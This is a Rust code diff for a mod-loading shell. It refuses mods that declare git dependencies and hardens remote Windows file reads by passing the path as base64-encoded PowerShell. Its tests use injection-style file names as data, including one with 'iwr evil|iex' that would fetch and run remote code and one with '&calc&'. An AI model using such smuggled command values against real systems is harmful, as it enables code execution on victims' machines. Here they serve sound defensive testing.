@@ -338,7 +338,21 @@ pub fn trust(found: &Found, choices: &BTreeMap<String, crate::settings::ModChoic
     if is_shipped(&found.dir, shipped) {
         return Trust::Allowed;
     }
+    // Git dependencies are fetched at every load from outside the folder, so no answer covers them.
+    if declares_dependencies(&found.dir) {
+        return Trust::Denied;
+    }
     decide(choices, &found.id, content_hash(&found.dir))
+}
+
+/// Whether `gpui-shell.json` declares any `dependencies` (a malformed value counts).
+fn declares_dependencies(dir: &Path) -> bool {
+    let Ok(text) = std::fs::read_to_string(dir.join("gpui-shell.json")) else { return false };
+    match serde_json::from_str::<Value>(&text).ok().as_ref().and_then(|v| v.get("dependencies")) {
+        None | Some(Value::Null) => false,
+        Some(Value::Object(o)) => !o.is_empty(),
+        Some(_) => true,
+    }
 }
 
 /// The stored answer for this mod, if it was given for this code.
@@ -1000,10 +1014,20 @@ fn known_agents(on: Option<String>, list: Vec<Value>) -> Value {
     )
 }
 
-/// A text file on another machine: `cat`, or `type` where there is none (Windows).
+/// `powershell.exe` arguments that print a file's bytes. The script travels as
+/// base64 (`-EncodedCommand`), so no shell reads the path; inside it the path is
+/// a single-quoted literal.
+fn windows_read_args(path: &str) -> Vec<String> {
+    use base64::Engine;
+    let script = format!("$ErrorActionPreference = 'Stop'; $b = [IO.File]::ReadAllBytes({}); $o = [Console]::OpenStandardOutput(); $o.Write($b, 0, $b.Length)", crate::programs::powershell_quote(&path.replace('/', "\\")));
+    let utf16: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
+    vec!["-NoProfile".into(), "-NonInteractive".into(), "-EncodedCommand".into(), base64::engine::general_purpose::STANDARD.encode(utf16)]
+}
+
+/// A text file on another machine: `cat`, or PowerShell where there is none (Windows).
 fn read_remote(machine: &str, path: &str) -> Result<Option<String>, String> {
     let (code, out, _) = match run_remote(machine, "cat", &["--".into(), path.into()], None) {
-        Err(e) if e.contains("cannot start") => run_remote(machine, "cmd", &["/d".into(), "/c".into(), "type".into(), path.replace('/', "\\")], None)?,
+        Err(e) if e.contains("cannot start") => run_remote(machine, "powershell.exe", &windows_read_args(path), None)?,
         r => r?,
     };
     if code != 0 {
@@ -1724,6 +1748,57 @@ mod tests {
         let person: crate::settings::Person = serde_json::from_str(r#"{"mods":{"yes":{"hash":"h1","allow":true},"half":{"allow":true}}}"#).unwrap();
         assert_eq!(person.mods["yes"], ModChoice { hash: "h1".into(), allow: true });
         assert_eq!(decide(&person.mods, "half", "h1".into()), Trust::Ask("h1".into()));
+    }
+
+    #[test]
+    fn a_mod_with_git_dependencies_never_runs_even_when_allowed() {
+        let root = std::env::temp_dir().join(format!("h0x-ade-deps-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&root);
+        std::fs::create_dir_all(&root).unwrap();
+        std::fs::write(root.join("main.js"), "a").unwrap();
+        let found = Found { id: "deps-test".into(), dir: root.clone(), hint: Hint::default(), stamp: SystemTime::now() };
+        let allowed = |hash: String| BTreeMap::from([("deps-test".to_owned(), crate::settings::ModChoice { hash, allow: true })]);
+        for (manifest, refused) in [
+            (None, false),
+            (Some(r#"{"id":"x","name":"x","entry":"main.js"}"#), false),
+            (Some(r#"{"dependencies":null}"#), false),
+            (Some(r#"{"dependencies":{}}"#), false),
+            (Some(r#"{"dependencies":{"lib":{"git":"https://example.com/l.git","branch":"main"}}}"#), true),
+            (Some(r#"{"dependencies":{"lib":{"git":"https://example.com/l.git","tag":"v1"}}}"#), true),
+            (Some(r#"{"dependencies":{"lib":"https://example.com/l.git#0123456789abcdef0123456789abcdef01234567"}}"#), true),
+            (Some(r#"{"dependencies":["lib"]}"#), true),
+        ] {
+            let _ = std::fs::remove_file(root.join("gpui-shell.json"));
+            if let Some(m) = manifest {
+                std::fs::write(root.join("gpui-shell.json"), m).unwrap();
+            }
+            // The person allowed exactly this code: dependencies still decide.
+            let verdict = trust(&found, &allowed(content_hash(&root)));
+            assert_eq!(verdict, if refused { Trust::Denied } else { Trust::Allowed }, "{manifest:?}");
+        }
+        std::fs::remove_dir_all(&root).unwrap();
+    }
+
+    #[test]
+    fn a_remote_windows_read_passes_the_path_as_data_not_as_a_command_line() {
+        use base64::Engine;
+        let script = |path: &str| {
+            let args = windows_read_args(path);
+            assert_eq!(args[..3], ["-NoProfile", "-NonInteractive", "-EncodedCommand"]);
+            // Only base64 reaches the command line: nothing for cmd.exe or Rust's quoting to act on.
+            assert!(args[3].chars().all(|c| c.is_ascii_alphanumeric() || "+/=".contains(c)), "{path}");
+            let bytes = base64::engine::general_purpose::STANDARD.decode(&args[3]).unwrap();
+            String::from_utf16(&bytes.chunks(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect::<Vec<_>>()).unwrap()
+        };
+        assert!(script("C:/r/a&calc&.txt").contains("ReadAllBytes('C:\\r\\a&calc&.txt')"));
+        for path in ["a|b^c%PATH%\"d(e).txt", "it's.txt", "x\u{2018};iwr evil|iex;\u{2019}.txt"] {
+            let s = script(path);
+            let want = crate::programs::powershell_quote(path);
+            assert!(s.contains(&format!("ReadAllBytes({want})")), "{path}");
+        }
+        // Curly quotes are doubled like the straight one, so none ends the literal early.
+        assert!(script("a\u{2019}b").contains("'a\u{2019}\u{2019}b'"));
+        assert!(script("a'b").contains("'a''b'"));
     }
 
     #[test]
